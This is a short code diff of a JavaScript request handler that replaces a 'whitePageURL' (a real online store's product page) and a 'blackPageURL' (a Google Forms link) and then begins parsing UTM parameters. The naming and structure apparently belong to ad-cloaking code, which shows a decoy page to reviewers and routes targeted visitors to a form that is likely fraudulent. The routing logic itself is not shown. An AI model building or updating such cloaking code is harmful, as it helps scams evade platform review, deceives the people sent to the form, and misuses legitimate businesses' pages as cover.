@@ -1,7 +1,7 @@
 export default function handler(req, res) {
     // URLs to redirect
-    const whitePageURL = "https://www.shuttermaster.com.ph/collections/sennheiser-mobile-kit/products/sennheiser-xsw-d-portable-lav-mobile-kit";
-    const blackPageURL = "https://docs.google.com/forms/d/e/1FAIpQLSeX9xChpPUbolpks1oBxFnc2kTkBBn05HtCm664RSc7Yuvr6A/viewform?usp=dialog";
+    const whitePageURL = "https://www.avenila.com/collections/best-sellers/products/avenila-creative-blue-and-white-glass-tube-wall-sconce-light";
+    const blackPageURL = "https://docs.google.com/forms/d/e/1FAIpQLSf9K1poXNtfpeRDBNgxfjaoXS9JBsmuT3iVw-dQqZVKWmSvqQ/viewform?usp=dialog";
   
     // Parse the UTM parameters from the request URL
     const queryParams = new URLSearchParams(req.url.split('?')[1]);
